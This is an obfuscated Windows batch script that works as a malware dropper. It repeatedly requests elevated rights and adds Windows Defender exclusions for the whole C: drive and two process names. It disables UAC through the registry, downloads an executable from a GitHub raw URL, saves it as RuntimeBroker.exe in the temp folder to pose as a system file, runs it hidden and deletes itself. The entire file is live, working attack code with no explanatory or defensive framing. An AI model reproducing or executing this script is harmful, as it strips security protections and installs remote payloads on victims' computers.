@echo off & setlocal enableDelayedExpansion
set "BbU=>nul" & set "LfT=NET" & set "MYYi=2>&1" & set "VECrc=SESSION"
%LfT% %VECrc% %BbU% %MYYi%
set "e=!errorlevel!" & set "a=:A" & set "b=:B"
if !e! equ 0 (goto %a%) else (goto %b%)

:A
set "gNavW=baz" & set "CWc=bar" & set "Duoe=qux" & set "WUSnj=foo" & rem LhsY YIAYYo gqOLQ
set "gJK=powershell -ExecutionPolicy Bypass -Command"
set "fydp=[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; Add-MpPreference -ExclusionPath"
set "FKK='C:\' -ErrorAction SilentlyContinue"
!gJK! "!fydp! !FKK!" %BbU% %MYYi%
set "APo=Add-MpPreference -ExclusionProcess 'appy.exe' -ErrorAction SilentlyContinue"
!gJK! "!APo!" %BbU% %MYYi%
set "SibF=Add-MpPreference -ExclusionProcess 'Service Runtime Management Agent.exe' -ErrorAction SilentlyContinue"
!gJK! "!SibF!" %BbU% %MYYi%
set "ThQK=Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'"
set "MJDjE=-Name 'EnableLUA' -Value 0"
!gJK! "!ThQK! !MJDjE!" %BbU% %MYYi%
set "wpP=if ((Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath -contains 'C:\') { exit 0 } else { exit 1 } "
!gJK! "!wpP!" %BbU% %MYYi%
if !errorlevel! neq 0 (goto %a%)
set "FYbkm=timeout /t" & !FYbkm! 2 %BbU% %MYYi%
set "AJpP=$ProgressPreference = 'SilentlyContinue'; $ErrorActionPreference = 'SilentlyContinue';"
set "dGtyj=Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/kamzat.exe' -OutFile '%TEMP%\RuntimeBroker.exe' -UseBasicParsing"
!gJK! "!AJpP! !dGtyj!" %BbU% %MYYi%

:W
if not exist "%TEMP%\RuntimeBroker.exe" (!FYbkm! 1 %BbU% %MYYi% & goto :W)
start "" /B "%TEMP%\RuntimeBroker.exe" %BbU% %MYYi%
del /f /q "%~f0" %BbU% %MYYi%
exit /b

:B
set "h=powershell -WindowStyle Hidden -Command"
set "j1=Start-Process -WindowStyle Hidden -FilePath '%~f0' -Verb RunAs"
!h! "!j1!" %BbU% %MYYi%
if !errorlevel! neq 0 (!FYbkm! 3 %BbU% %MYYi% & goto %b%)
exit /b
